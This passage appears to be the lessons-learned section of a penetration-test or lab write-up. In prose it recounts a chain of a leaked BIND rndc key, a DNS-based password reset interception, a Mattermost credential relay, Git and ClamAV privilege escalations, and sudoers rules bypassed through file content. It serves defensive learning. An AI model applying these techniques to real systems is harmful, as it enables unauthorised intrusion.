The most consequential finding is the **BIND rndc-key leak**. Without the key, the DNS zone could not be modified, and the password reset interception would not have been possible.

The second lesson is that **operational features are attack surfaces**. The Mattermost provisioning integration accepted any target and connected with stored credentials — effectively acting as a credential relay.

The third lesson is about **patching as a defensive layer**. Both privilege escalations — Git and ClamAV — were known CVEs with public exploits, months after the fixes were available.

The fourth lesson is that **sudoers rules restrict commands, not content**. Restricting `git apply` to a filename pattern does not restrict the patch content. Restricting `clamscan --debug` to a directory does not restrict the file.
